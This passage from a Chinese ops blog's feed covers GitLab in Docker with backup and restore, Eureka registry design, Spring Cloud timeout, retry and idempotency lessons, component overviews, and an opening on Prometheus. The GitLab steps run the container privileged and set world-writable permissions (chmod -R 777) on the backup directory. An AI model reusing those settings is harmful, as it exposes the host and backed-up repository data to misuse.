    <content type="text"><![CDATA[目的使用Docker容器来快速安装配置和使用的gitlab 参考gitlab官网镜像 安装1234567891011121314151617# 构建外挂目录mkdir -p /etc/gitlab /var/log/gitlab /var/opt/gitlab# 拉取镜像并运行实例docker run -d \ -p 9999:80 \ # 指定web访问端口 --cpu-shares 2048 \ # 限制CPU资源，最少2core，参考：https://docs.gitlab.com.cn/ce/install/requirements.html --cpu-period=20000 \ --cpu-quota=20000 \ --memory 4294967296 \ # 限制内存，最少4G --hostname xxxx.com \ # 绑定git clone的访问域名，与ngx上一致 --name gitlab \ --privileged=true \ # 忽略挂载目录的权限 -v /etc/gitlab:/etc/gitlab \ # 外挂相关路径 -v /var/log/gitlab:/var/log/gitlab \ -v /var/opt/gitlab:/var/opt/gitlab \ twang2218/gitlab-ce-zh:10.2 配置优化限制worker进程数默认配置中，worker进程数与本机CPU个数一致，会大量占用内存，导致容器的内存持续增长，直至服务宕机，报5xx 解决方案：修改/etc/gitlab/gitlab.rb中配置 12345678910################################################################################## GitLab Unicorn##! Tweak unicorn settings.##! Docs: https://docs.gitlab.com/omnibus/settings/unicorn.html################################################################################# unicorn['worker_timeout'] = 60###! Minimum worker_processes is 2 at this moment###! See https://gitlab.com/gitlab-org/gitlab-ce/issues/18771unicorn['worker_processes'] = 2 # 去除原注释，指定worker数和分配的CPU个数一致 然后重启 启用邮件通知编辑/etc/gitlab/gitlab.rb 123456789101112131415161718192021……之前配置略……### Email Settings# gitlab_rails['gitlab_email_enabled'] = truegitlab_rails['gitlab_email_from'] = 'xxxxx'# gitlab_rails['gitlab_email_display_name'] = 'xxxxx'# gitlab_rails['gitlab_email_reply_to'] = 'noreply@example.com'gitlab_rails['gitlab_email_subject_suffix'] = '[xxx.gitlab]'……### GitLab email server settings###! Docs: https://docs.gitlab.com/omnibus/settings/smtp.html###! **Use smtp instead of sendmail/postfix.**gitlab_rails['smtp_enable'] = truegitlab_rails['smtp_address'] = "xxxx"gitlab_rails['smtp_port'] = 25gitlab_rails['smtp_user_name'] = "xxxxx"gitlab_rails['smtp_password'] = "xxxxx"# gitlab_rails['smtp_domain'] = "xxxxx"gitlab_rails['smtp_authentication'] = "login"gitlab_rails['smtp_enable_starttls_auto'] = true# gitlab_rails['smtp_tls'] = false…… 使用备份操作Gitlab的备份目录路径设置123456789101112vim /etc/gitlab/gitlab.rbgitlab_rails['manage_backup_path'] = truegitlab_rails['backup_path'] = "/data/gitlab/backups" //gitlab备份目录gitlab_rails['backup_archive_permissions'] = 0644 //生成的备份文件权限gitlab_rails['backup_keep_time'] = 7776000 //备份保留天数为3个月（即90天，这里是7776000秒）mkdir -p /data/gitlab/backupschown -R git.git /data/gitlab/backupschmod -R 777 /data/gitlab/backupsgitlab-ctl reconfigure #重新加载配置 GItlab备份操作123456# 手动备份cd /data/gitlab/backups/gitlab-rake gitlab:backup:create#上面步骤是自动备份，查看备份文件ll -rw-r--r-- 1 git git 245760 Nov 12 15:33 1510472027_2017_11_12_9.4.5_gitlab_backup.tar 123456789101112#自动备份cd /data/gitlab/backups/#编写备份脚本vim gitlab_backup.sh#!/bin/bash/usr/bin/gitlab-rake gitlab:backup:create CRON=1注意：环境变量CRON=1的作用是如果没有任何错误发生时， 抑制备份脚本的所有进度输出#编写备份脚本，结合crontab实施自动定时备份，比如每天0点、6点、12点、18点各备份一次0 0,6,12,18 * * * /bin/bash -x /data/gitlab/backups/gitlab_backup.sh &gt; /dev/null 2&gt;&amp;1 恢复操作注意：GItlab只能还原到与备份文件相同的gitlab版本。 停止相关数据连接服务123gitlab-ctl stop unicorngitlab-ctl stop sidekiqgitlab-ctl status 恢复1234567891011#进入目录cd /data/gitlab/backups#查看备份ll-rw-r--r-- 1 git git 245760 Nov 12 15:33 1510472027_2017_11_12_9.4.5_gitlab_backup.tar#Gitlab的恢复操作会先将当前所有的数据清空，然后再根据备份数据进行恢复gitlab-rake gitlab:backup:restore BACKUP=1510472027_2017_11_12_9.4.5# 启动gitlab-ctl start# 验证检查gitlab-rake gitlab:check SANITIZE=true]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微服务架构系列思考]]></title>
    <url>%2Farticles%2F32a029fb.html</url>
    <content type="text"><![CDATA[问题起源Spring Cloud微服务架构体系中，Eureka是一个至关重要的组件，它扮演着微服务注册中心的角色，所有的服务注册与服务发现，都是依赖Eureka的。 之前不少初学Spring Cloud的朋友在落地公司的生产环境部署时，经常会有一个疑问：Eureka Server到底要部署几台机器？ 我们的系统那么多服务，到底会对Eureka Server产生多大的访问压力？Eureka Server能不能抗住一个大型系统的访问压力？ 你现在心里一定很多疑问，别着急，咱们这就去探索一下，Eureka作为微服务注册中心的核心原理。下面这些问题，大伙儿先看看，有个大概的印象。 带着这些问题，来看后面的内容，效果更佳。 ● Eureka注册中心使用什么样的方式来储存各个服务注册时发送过来的机器地址和端口号？ ● 各个服务找Eureka Server拉取注册表的时候，是什么样的频率？ ● 各个服务是如何拉取注册表的？ ● 对于一个有几百个服务，部署上千台机器的大型分布式系统来说，这套系统会对Eureka Server造成多大的访问压力？ ● Eureka Server从技术层面是如何抗住日千万级访问量的？ 先给大家说一个基本知识点，各个服务内的Eureka Client组件，默认情况下，每隔30秒会发送一个请求到Eureka Server，来拉取最近有变化的服务信息 举个例子： ● 库存服务原本部署在1台机器上，现在扩容了，部署到了3台机器，并且均注册到了Eureka Server上。 ● 然后订单服务的Eureka Client会每隔30秒去找Eureka Server拉取最近注册表的变化，看看其他服务的地址有没有变化。 除此之外，对Eureka Server一个比较常见的请求就是心跳，各个Eureka Client都会每隔30秒发送一次心跳请求到Eureka Server，通知人家说，哥们，我这个服务实例还活着！ 如果某个Eureka Client很长时间没有发送心跳给Eureka Server，那么就说明这个服务实例已经挂了。 光看上面的文字，各位童鞋可能没什么印象。老规矩！咱们还是来一张图，一起来直观的感受一下这个过程。 过程如图所示： Eureka Server设计精妙的注册表存储结构现在咱们假设你手头有一套大型的分布式系统，这套系统一共有100个服务，每个服务部署在20台机器上，机器是4核8G的标准配置。 这相当于什么呢？也就是说相当于你一共部署了100 * 20 = 2000个服务实例，有2000台机器。 而每台机器上的服务实例内部都有一个Eureka Client组件，这个Eureka Client组件每隔30秒会请求一次Eureka Server来拉取变化的注册表。 此外，每个服务实例上的Eureka Client都会每隔30秒发送一次心跳请求给Eureka Server。 那么大家算算，Eureka Server作为一个微服务注册中心，每秒钟要被请求多少次？一天要被请求多少次？ ● 很简单，我们就按最标准的算法来算，即每个服务实例每分钟请求2次拉取注册表，每分钟请求2次发送心跳 ● 这样的话，一个服务实例每分钟会请求4次，2000个服务实例每分钟请求8000次 ● 换算到每秒钟，则是8000 / 60 = 133次左右，我们直接可以大概估算为Eureka Server每秒钟会被请求150次 ● 所以，一天的话，应该就是8000 * 60 * 24 = 1152万，也就是每天千万级访问量 好！经过这么一个测算，大家是否发现这里的奥秘了？ ● 首先第一点，对于微服务注册中心这种组件，在一开始设计他这个注册表的拉取频率以及心跳发送频率的时候，就已经考虑到了一个大型系统的各个服务请求时的压力，每秒会承载多大的请求量。 ● 所以说各个服务实例每隔30秒发起一次请求拉取变化的注册表，以及每隔30秒发送一次心跳给Eureka Server，其实这个时间安排是有他的用意的。 按照我们的测算，一个上百个服务，部署几千台机器的大规模系统，按照这样的一个频率请求Eureka Server，日请求量在千万级，每秒的访问量应该是固定在150次左右，即使算上其他的一些额外操作，算到每秒钟请求Eureka Server在200次~300次吧。 所以通过设置一个适中的拉取注册表以及发送心跳的频率，保证大规模系统里对Eureka Server的请求压力不会太大。 关键问题来了，Eureka Server是如何保证轻松抗住这每秒数百次请求，每天千万级请求的呢？ 要搞清楚这个，首先得清楚人家Eureka Server到底是用什么来存储注册表的？三个字，看源码！ 接下来咱们就一起进入Eureka的源码里一探究竟： ● 如上图所示，图中名为registry的CocurrentHashMap，就是注册表的核心结构。看完之后忍不住先赞叹一下，真是精妙的设计！ ● 从代码中可以看到，Eureka Server的注册表直接基于纯内存，就是在内存里维护了一个数据结构。 ● 各个服务发起注册、服务下线、服务故障，全部会在内存里维护和更新这个注册表。 ● 各个服务每隔30秒拉取注册表的时候，其实Eureka Server就是直接提供内存里存储的有变化的注册表数据给他们就可以了。 ● 同样，每隔30秒发起心跳的时候，也是在这个纯内存的CocurrentHashMap数据结构里更新心跳时间。 一句话概括：维护注册表、拉取注册表、更新心跳时间，全部发生在内存里！这就是Eureka Server非常核心的一个点。 搞清楚了这一点，咱们再来分析一下这个叫做registry的东西的数据结构，大家千万别被它复杂的外表唬住了，沉下心来，一层层的分析！ ● 首先，这个ConcurrentHashMap的key就是服务名称，比如说“inventory-service”，就是一个服务名称。 ● 而value：Map&lt;String, Lease则代表了一个服务的多个服务实例。 ● 举个例子：比如说“inventory-service”是可以有3个服务实例的，每个服务实例部署在一台机器上 接下来咱们再来看里面这个小Map： Map&lt;String, Lease ● 这个Map的key就是服务实例的id ● value是一个叫做 Lease的东西。这又是什么鬼呢？ ■ 首先说下InstanceInfo，其实啊，我们见名知义，这个InstanceInfo就代表了服务实例的具体信息，比如机器的ip地址、hostname以及端口号 ■ 而Lease的这个Lease，里面则会维护每个服务最近一次发送心跳的时间 Eureka Server端优秀的多级缓存机制假设Eureka Server部署在4核8G的普通机器上，那么基于内存来承载各个服务的请求，每秒钟最多可以处理多少请求呢？ ● 根据之前做过的测试，单台4核8G的机器，处理一些纯内存的操作，哪怕加上一些网络请求的开销，每秒处理几百请求是很轻松的。哪怕是更大规模的机器和请求量，处理起来，也是轻松加愉快。 ● 而且Eureka Server为了避免同时读写内存数据结构造成的并发冲突问题，还采用了多级缓存机制来进一步提升服务请求的响应速度。 ● 在拉取注册表的时候： ◑ 首先从ReadOnlyCacheMap里查缓存的注册表。 ◑ 如果没有，就找ReadWriteCacheMap里缓存的注册表。 ◑ 如果还没有，就从内存中获取实际的注册表数据。 ● 在注册表发生变更的时候： ◑ 会在内存中更新变更的注册表数据，同时过期掉ReadWriteCacheMap。 ◑ 这个过程不会影响ReadOnlyCacheMap提供人家查询注册表。 ◑ 在一段时间内，默认是30秒，各个服务拉取注册表数据都会直接读ReadOnlyCacheMap。 ◑ 在30秒过后，Eureka Server的后台线程发现ReadWriteCacheMap已经清空了，那么也会清空ReadOnlyCacheMap中的缓存 ◑ 下次有服务拉取注册表，又会从内存中获取最新的数据了，同时填充各个缓存。 多级缓存机制的优点是什么？ 1.这种多级缓存机制的设计，尽可能保证了内存注册表数据不会出现频繁的读写冲突问题。 2.并且进一步保证对Eureka Server的大量请求，都是快速从纯内存走，性能极高。 为方便大家更好的理解，同样来一张图，大家跟着图再来回顾一下这整个过程： 总结● 通过上面的分析可以看到，Eureka通过设置适当的请求频率（拉取注册表30秒间隔，发送心跳30秒间隔），可以保证一个大规模的系统每秒请求Eureka Server的次数在几百次。 ● 同时还通过纯内存的注册表，保证了所有的请求都可以在内存处理，这样确保了极高的性能，普通机器一秒钟处理几百请求都是轻松+愉快的。 ● 另外还有多级缓存机制，确保说不会针对内存数据结构发生频繁的读写并发冲突操作，进一步提升性能。 上述就是Spring Cloud架构中，Eureka作为微服务注册中心可以承载大规模系统每天千万级访问量的原理]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微服务架构系列思考]]></title>
    <url>%2Farticles%2F4c5309d0.html</url>
    <content type="text"><![CDATA[背景相信不少朋友都在自己公司使用Spring Cloud框架来构建微服务架构，毕竟现在这是非常火的一门技术。 如果只是用户量很少的传统IT系统，使用Spring Cloud可能还暴露不出什么问题。 如果是较多用户量，高峰每秒高达上万并发请求的互联网公司的系统，使用Spring Cloud技术就有一些问题需要注意了。 真实案例场景引入，问题初现先不空聊原理、理论，来讲一个真实的例子，这是我的一个朋友在创业互联网公司发生过的真实案例。 朋友A的公司做互联网类的创业，组建了一个小型研发团队，上来就用了Spring Cloud技术栈来构建微服务架构的系统。一段时间没日没夜的加班，好不容易核心业务系统给做出来了，平时正常QA测试没发现什么大毛病，感觉性能还不错，一切都很完美。然后系统就这么上线了，一开始用户规模很小，注册用户量小几十万，日活几千用户。 每天都有新的数据进入数据库的表中，就这么日积月累的，没想到数据规模居然慢慢吞吞增长到了单表几百万。 这个时候呢，看起来也没太大的毛病，就是有用户反映，系统有些操作，会感觉卡顿几秒钟，会刷不出来页面。 这是为啥呢？ 核心原因是单表数据量大了一些，达到了几百万。 有个别服务，跑的SQL比较复杂，一大堆的多表关联 并且还没有设计好索引，或者是设计了索引，但无奈一些小弟写了上百行的大SQL，SQL实在太复杂了，那么一个SQL跑出来好几秒肯定是正常的。 如果大家对微服务框架有点了解的话，应该知道，比如Feign + Ribbon组成的服务调用框架，是有接口调用超时这一说的，有一些参数可以设置接口调用的超时时间。 如果你调用一个接口，好几秒刷不出来，人家就超时异常返回，用户就刷不出来页面了。 扬汤止沸，饮鸩止渴一般碰到这种事情，一大坨屎一样的SQL摆在那儿，写SQL的人过一个月自己都看不懂了，80%的工程师看着都不愿意去花时间重写和优化。 一是修改的人力成本太高，二是谁敢负担这责任呢？系统跑的好好的，就是慢了点而已，结果你硬是乱改一通，重构，把系统核心业务流程搞挂了怎么办？ 所以说，那些兄弟第一反应是：增加超时时间啊！接口慢点可以，但是别超时不响应啊！ 让接口执行个几秒把结果返回，用户不就可以刷出来页面了！不用重构系统了啊！轻松+愉快！ 如何增加呢？很简单，看下面的参数就知道了： 大家如果看过之前的文章，应该知道，Spring Cloud里一般会用hystrix的线程池来执行接口调用的请求。。 所以设置超时一般设置两个地方，feign和ribbon那块的超时，还有hystrix那块的超时。其中后者那块的超时一般必须大于前者。 Spring Cloud玩儿的好的兄弟，可千万别看着这些配置发笑，因为我确实见过不少Spring Cloud玩儿的没那么溜的哥们，真的就这么干了。 好了，日子在继续。。。 优化了参数后，看上去效果不错，用户虽然觉得有的页面慢是慢点，但是起码过几秒能刷出来。 这个时候，日活几千的用户量，压根儿没什么并发可言，高峰期每秒最多一二十并发请求罢了。 大家看看下面这张图，感受一下现场氛围： 问题爆发，洪水猛兽随着时间的推移，公司业务高速发展…… 那位兄弟的公司，在系统打磨成熟，几万用户试点都ok之后，老板立马拿到一轮几千万的融资。 公司上上下下意气风发啊！紧接着就是组建运营团队，地推团队，全国大范围的推广。 总之就是三个字：推！推！推！ 这一推不打紧！研发人员在后台系统发现，自己的用户量蹭蹭蹭的增长，注册用户增长了几十倍，突破了千万级别，日活用户也翻了几十倍，在活动之类的高峰期，居然达到了上百万的日活用户量。。。 幸福的烦恼。。。 为什么这么说？因为用户量上来后，悲剧的事情就发生了。 高峰期每秒的并发请求居然达到了近万的程度，研发团队的兄弟们哪里敢怠慢！在这个过程中，先是紧张的各种扩容服务，一台变两台，两台变八台。 然后数据库主从架构挂上去，读写分离是必须的，否则单个数据库服务器哪能承载那么大的请求！多搞几个从库，扛一下大量的读请求，这样基本就扛住了。 正准备松口气，更加悲剧的事情就发生了。 在这个过程中，那些兄弟经常会发现高峰期，系统的某个功能页面，突然就整个hang死了，就是没法再响应任何请求！所有用户刷新这个页面全部都是无法响应！ 这是为什么呢？ 原因很简单啊！一个服务A的实例里，专门调用服务B的那个线程池里的线程，总共可能就几十个。每个线程调用服务B都会卡住5秒钟。 那如果每秒钟过来几百个请求这个服务实例呢？一下子那个线程池里的线程就全部hang死了，没法再响应任何请求了。 大家来看看下面这张图，再直观的感受一下这个无助的过程！ 这个时候咋办？兄弟们只能祭出程序员最古老的法宝，重启机器！ 遇到页面刷不出来，只能重启机器，相当于短暂的初始化了一下机器内的资源。 然后接着运行一段时间，又卡死，再次重启！真是令人崩溃啊！用户们的体验是极差的，老板的心情是愤怒的！ 画外音： 其实这个问题本身不大，但如果对Spring Cloud没有高并发场景的真实经验，确实可能会跟这帮兄弟一样，搞出些莫名其妙的问题。 比如这个公司，明明应该去优化服务接口性能，结果硬是调大了超时时间。结果导致并发量高了，对那个服务的调用直接hang死，系统的核心页面刷不出来，影响用户体验了，这怪谁呢？ 追本溯源，治标治本没法子了，那帮兄弟们只能找人求助。下面就是他们完成系统优化的过程。 第一步 关键点，优化图中核心服务B的性能。互联网公司，核心业务逻辑，面向C端用户高并发的请求，不要用上百行的大SQL，多表关联，那样单表几百万行数据量的话，会导致一下执行好几秒。 其实最佳的方式，就是对数据库就执行简单的单表查询和更新，然后复杂的业务逻辑全部放在java系统中来执行，比如一些关联，或者是计算之类的工作。 这一步干完了之后，那个核心服务B的响应速度就已经优化成几十毫秒了，是不是很开心？从几秒变成了几十毫秒！ 第二步 那个超时的时间，也就是上面那段ribbon和hystrix的超时时间设置。 奉劝各位同学，不要因为系统接口的性能过差而懒惰，搞成几秒甚至几十秒的超时，一般超时定义在1秒以内，是比较通用以及合理的。 为什么这么说？ 因为一个接口，理论的最佳响应速度应该在200ms以内，或者慢点的接口就几百毫秒。 如果一个接口响应时间达到1秒+，建议考虑用缓存、索引、NoSQL等各种你能想到的技术手段，优化一下性能。 否则你要是胡乱设置超时时间是几秒，甚至几十秒，万一下游服务偶然出了点问题响应时间长了点呢？那你这个线程池里的线程立马全部卡死！ 具体hystrix的线程池以及超时时间的最佳生产实践，请见下一篇文章：《微服务架构如何保障双11狂欢下的99.99%高可用》 这两步解决之后，其实系统表现就正常了，核心服务B响应速度很快速，而且超时时间也在1秒以内，不会出现hystrix线程池频繁卡死的情况了。 第三步 事儿还没完，你要真觉得两步就搞定了，那还是经验不足。 如果你要是超时时间设置成了1秒，如果就是因为偶然发生的网络抖动，导致接口某次调用就是在1.5秒呢？这个是经常发生的，因为网络的问题，接口调用偶然超时。 所以此时配合着超时时间，一般都会设置一个合理的重试，如下所示： 设置这段重试之后，Spring Cloud中的Feign + Ribbon的组合，在进行服务调用的时候，如果发现某台机器超时请求失败，会自动重试这台机器，如果还是不行会换另外一台机器重试。 这样由于偶尔的网络请求造成的超时，不也可以通过自动重试避免了？ 第四步 其实事儿还没完，如果把重试参数配置了，结果你居然就放手了，那还是没对人家负责任啊！ 你的系统架构中，只要涉及到了重试，那么必须上接口的幂等性保障机制。 否则的话，试想一下，你要是对一个接口重试了好几次，结果人家重复插入了多条数据，该怎么办呢？ 其实幂等性保证本身并不复杂，根据业务来，常见的方案： 可以在数据库里建一个唯一索引，插入数据的时候如果唯一索引冲突了就不会插入重复数据或者是通过redis里放一个唯一id值，然后每次要插入数据，都通过redis判断一下，那个值如果已经存在了，那么就不要插入重复数据了。类似这样的方案还有一些。总之，要保证一个接口被多次调用的时候，不能插入重复的数据。 总结全文有图有真相！老规矩，最后给大家上一张图，最终优化后的系统表现大概是长下面这样子的。]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微服务架构系列思考]]></title>
    <url>%2Farticles%2Fe36292b2.html</url>
    <content type="text"><![CDATA[概述毫无疑问，Spring Cloud是目前微服务架构领域的翘楚，无数的书籍博客都在讲解这个技术。不过大多数讲解还停留在对Spring Cloud功能使用的层面，其底层的很多原理，很多人可能并不知晓。因此本文将通过大量的手绘图，给大家谈谈Spring Cloud微服务架构的底层原理。 实际上，Spring Cloud是一个全家桶式的技术栈，包含了很多组件。本文先从其最核心的几个组件入手，来剖析一下其底层的工作原理。也就是Eureka、Ribbon、Feign、Hystrix、Zuul这几个组件。 业务场景先来给大家说一个业务场景，假设咱们现在开发一个电商网站，要实现支付订单的功能，流程如下： 创建一个订单之后，如果用户立刻支付了这个订单，我们需要将订单状态更新为“已支付” 扣减相应的商品库存 通知仓储中心，进行发货 给用户的这次购物增加相应的积分 针对上述流程，我们需要有订单服务、库存服务、仓储服务、积分服务。整个流程的大体思路如下： 用户针对一个订单完成支付之后，就会去找订单服务，更新订单状态 订单服务调用库存服务，完成相应功能 订单服务调用仓储服务，完成相应功能 订单服务调用积分服务，完成相应功能 至此，整个支付订单的业务流程结束 下图这张图，清晰表明了各服务间的调用过程： 好！有了业务场景之后，咱们就一起来看看Spring Cloud微服务架构中，这几个组件如何相互协作，各自发挥的作用以及其背后的原理。 Spring Cloud核心组件Eureka咱们来考虑第一个问题：订单服务想要调用库存服务、仓储服务，或者是积分服务，怎么调用？ 订单服务压根儿就不知道人家库存服务在哪台机器上啊！他就算想要发起一个请求，都不知道发送给谁，有心无力！ 这时候，就轮到Spring Cloud Eureka出场了。Eureka是微服务架构中的注册中心，专门负责服务的注册与发现。 咱们来看看下面的这张图，结合图来仔细剖析一下整个流程： 如上图所示，库存服务、仓储服务、积分服务中都有一个Eureka Client组件，这个组件专门负责将这个服务的信息注册到Eureka Server中。说白了，就是告诉Eureka Server，自己在哪台机器上，监听着哪个端口。而Eureka Server是一个注册中心，里面有一个注册表，保存了各服务所在的机器和端口号 订单服务里也有一个Eureka Client组件，这个Eureka Client组件会找Eureka Server问一下：库存服务在哪台机器啊？监听着哪个端口啊？仓储服务呢？积分服务呢？然后就可以把这些相关信息从Eureka Server的注册表中拉取到自己本地缓存起来。 这时如果订单服务想要调用库存服务，不就可以找自己本地的Eureka Client问一下库存服务在哪台机器？监听哪个端口吗？收到响应后，紧接着就可以发送一个请求过去，调用库存服务扣减库存的那个接口！同理，如果订单服务要调用仓储服务、积分服务，也是如法炮制。 总结一下： Eureka Client：负责将这个服务的信息注册到Eureka Server中 Eureka Server：注册中心，里面有一个注册表，保存了各个服务所在的机器和端口号 Feign现在订单服务确实知道库存服务、积分服务、仓库服务在哪里了，同时也监听着哪些端口号了。但是新问题又来了：难道订单服务要自己写一大堆代码，跟其他服务建立网络连接，然后构造一个复杂的请求，接着发送请求过去，最后对返回的响应结果再写一大堆代码来处理吗？ 这是上述流程翻译的代码片段，咱们一起来看看，体会一下这种绝望而无助的感受！！！ 友情提示，前方高能： 看完上面那一大段代码，有没有感到后背发凉、一身冷汗？实际上你进行服务间调用时，如果每次都手写代码，代码量比上面那段要多至少几倍，所以这个事儿压根儿就不是地球人能干的。 既然如此，那怎么办呢？别急，Feign早已为我们提供好了优雅的解决方案。来看看如果用Feign的话，你的订单服务调用库存服务的代码会变成啥样？ 看完上面的代码什么感觉？是不是感觉整个世界都干净了，又找到了活下去的勇气！没有底层的建立连接、构造请求、解析响应的代码，直接就是用注解定义一个 FeignClient接口，然后调用那个接口就可以了。人家Feign Client会在底层根据你的注解，跟你指定的服务建立连接、构造请求、发起靕求、获取响应、解析响应，等等。这一系列脏活累活，人家Feign全给你干了。 那么问题来了，Feign是如何做到这么神奇的呢？很简单，Feign的一个关键机制就是使用了动态代理。咱们一起来看看下面的图，结合图来分析： 首先，如果你对某个接口定义了@FeignClient注解，Feign就会针对这个接口创建一个动态代理 接着你要是调用那个接口，本质就是会调用 Feign创建的动态代理，这是核心中的核心 Feign的动态代理会根据你在接口上的@RequestMapping等注解，来动态构造出你要请求的服务的地址 最后针对这个地址，发起请求、解析响应 Ribbon说完了Feign，还没完。现在新的问题又来了，如果人家库存服务部署在了5台机器上，如下所示： 192.168.169:9000 192.168.170:9000 192.168.171:9000 192.168.172:9000 192.168.173:9000 这下麻烦了！人家Feign怎么知道该请求哪台机器呢？ 这时Spring Cloud Ribbon就派上用场了。Ribbon就是专门解决这个问题的。它的作用是负载均衡，会帮你在每次请求时选择一台机器，均匀的把请求分发到各个机器上 Ribbon的负载均衡默认使用的最经典的Round Robin轮询算法。这是啥？简单来说，就是如果订单服务对库存服务发起10次请求，那就先让你请求第1台机器、然后是第2台机器、第3台机器、第4台机器、第5台机器，接着再来—个循环，第1台机器、第2台机器。。。以此类推。 此外，Ribbon是和Feign以及Eureka紧密协作，完成工作的，具体如下： 首先Ribbon会从 Eureka Client里获取到对应的服务注册表，也就知道了所有的服务都部署在了哪些机器上，在监听哪些端口号。 然后Ribbon就可以使用默认的Round Robin算法，从中选择一台机器 Feign就会针对这台机器，构造并发起请求。 对上述整个过程，再来一张图，帮助大家更深刻的理解： Hystrix在微服务架构里，一个系统会有很多的服务。以本文的业务场景为例：订单服务在一个业务流程里需要调用三个服务。现在假设订单服务自己最多只有100个线程可以处理请求，然后呢，积分服务不幸的挂了，每次订单服务调用积分服务的时候，都会卡住几秒钟，然后抛出—个超时异常。 咱们一起来分析一下，这样会导致什么问题？ 如果系统处于高并发的场景下，大量请求涌过来的时候，订单服务的100个线程都会卡在请求积分服务这块。导致订单服务没有一个线程可以处理请求 然后就会导致别人请求订单服务的时候，发现订单服务也挂了，不响应任何请求了 上面这个，就是微服务架构中恐怖的服务雪崩问题，如下图所示： 如上图，这么多服务互相调用，要是不做任何保护的话，某一个服务挂了，就会引起连锁反应，导致别的服务也挂。比如积分服务挂了，会导致订单服务的线程全部卡在请求积分服务这里，没有一个线程可以工作，瞬间导致订单服务也挂了，别人请求订单服务全部会卡住，无法响应。 但是我们思考一下，就算积分服务挂了，订单服务也可以不用挂啊！为什么？ 我们结合业务来看：支付订单的时候，只要把库存扣减了，然后通知仓库发货就OK了 如果积分服务挂了，大不了等他恢复之后，慢慢人肉手工恢复数据！为啥一定要因为一个积分服务挂了，就直接导致订单服务也挂了呢？不可以接受！ 现在问题分析完了，如何解决？ 这时就轮到Hystrix闪亮登场了。Hystrix是隔离、熔断以及降级的一个框架。啥意思呢？说白了，Hystrix会搞很多个小小的线程池，比如订单服务请求库存服务是一个线程池，请求仓储服务是一个线程池，请求积分服务是一个线程池。每个线程池里的线程就仅仅用于请求那个服务。 打个比方：现在很不幸，积分服务挂了，会咋样？ 当然会导致订单服务里的那个用来调用积分服务的线程都卡死不能工作了啊！但是由于订单服务调用库存服务、仓储服务的这两个线程池都是正常工作的，所以这两个服务不会受到任何影响。 这个时候如果别人请求订单服务，订单服务还是可以正常调用库存服务扣减库存，调用仓储服务通知发货。只不过调用积分服务的时候，每次都会报错。但是如果积分服务都挂了，每次调用都要去卡住几秒钟干啥呢？有意义吗？当然没有！所以我们直接对积分服务熔断不就得了，比如在5分钟内请求积分服务直接就返回了，不要去走网络请求卡住几秒钟，这个过程，就是所谓的熔断！ 那人家又说，兄弟，积分服务挂了你就熔断，好歹你干点儿什么啊！别啥都不干就直接返回啊？没问题，咱们就来个降级：每次调用积分服务，你就在数据库里记录一条消息，说给某某用户增加了多少积分，因为积分服务挂了，导致没增加成功！这样等积分服务恢复了，你可以根据这些记录手工加一下积分。这个过程，就是所谓的降级。 为帮助大家更直观的理解，接下来用一张图，梳理一下Hystrix隔离、熔断和降级的全流程： Zuul说完了Hystrix，接着给大家说说最后一个组件：Zuul，也就是微服务网关。这个组件是负责网络路由的。不懂网络路由？行，那我给你说说，如果没有Zuul的日常工作会怎样？ 假设你后台部署了几百个服务，现在有个前端兄弟，人家请求是直接从浏览器那儿发过来的。打个比方：人家要请求一下库存服务，你难道还让人家记着这服务的名字叫做inventory-service？部署在5台机器上？就算人家肯记住这一个，你后台可有几百个服务的名称和地址呢？难不成人家请求一个，就得记住一个？你要这样玩儿，那真是友谊的小船，说翻就翻！ 上面这种情况，压根儿是不现实的。所以一般微服务架构中都必然会设计一个网关在里面，像android、ios、pc前端、微信小程序、H5等等，不用去关心后端有几百个服务，就知道有一个网关，所有请求都往网关走，网关会根据请求中的一些特征，将请求转发给后端的各个服务。 而且有一个网关之后，还有很多好处，比如可以做统一的降级、限流、认证授权、安全，等等。 总结：最后再来总结一下，上述几个Spring Cloud核心组件，在微服务架构中，分别扮演的角色： Eureka：各个服务启动时，Eureka Client都会将服务注册到Eureka Server，并且Eureka Client还可以反过来从Eureka Server拉取注册表，从而知道其他服务在哪里 Ribbon：服务间发起请求的时候，基于Ribbon做负载均衡，从一个服务的多台机器中选择一台 Feign：基于Feign的动态代理机制，根据注解和选择的机器，拼接请求URL地址，发起请求 Hystrix：发起请求是通过Hystrix的线程池来走的，不同的服务走不同的线程池，实现了不同服务调用的隔离，避免了服务雪崩的问题 Zuul：如果前端、移动端要调用后端系统，统一从Zuul网关进入，由Zuul网关转发请求给对应的服务 以上就是我们通过一个电商业务场景，阐述了Spring Cloud微服务架构几个核心组件的底层原理。 文字总结还不够直观？没问题！我们将Spring Cloud的5个核心组件通过一张图串联起来，再来直观的感受一下其底层的架构原理：]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Prometheus基本原理和使用]]></title>
    <url>%2Farticles%2F65b2b731.html</url>
    <content type="text"><![CDATA[简介Prometheus是由SoundCloud开发的开源监控报警系统和时序列数据库(TSDB)。Prometheus使用Go语言开发，是Google BorgMon监控系统的开源版本。 2016年由Google发起Linux基金会旗下的原生云基金会(Cloud Native Computing Foundation), 将Prometheus纳入其下第二大开源项目。Prometheus目前在开源社区相当活跃。 Prometheus和Heapster(Heapster是K8S的一个子项目，用于获取集群的性能数据。)相比功能更完善、更全面。Prometheus性能也足够支撑上万台规模的集群。 源码https://github.com/prometheus/prometheus 文档https://prometheus.io/ 特点多维度数据模型。灵活的查询语言。不依赖分布式存储，单个服务器节点是自主的。通过基于HTTP的pull方式采集时序数据。可以通过中间网关进行时序列数据推送。通过服务发现或者静态配置来发现目标服务对象。支持多种多样的图表和界面展示，比如Grafana等。 相关组件：Prometheus生态系统由多个组件组成，它们中的一些是可选的。多数Prometheus组件是Go语言写的，这使得这些组件很容易编译和部署。 Prometheus Server主要负责数据采集和存储，提供PromQL查询语言的支持。 客户端SDK官方提供的客户端类库有go、java、scala、python、ruby，其他还有很多第三方开发的类库，支持nodejs、php、erlang等。 Push Gateway支持临时性Job主动推送指标的中间网关。 PromDash使用Rails开发可视化的Dashboard，用于可视化指标数据。 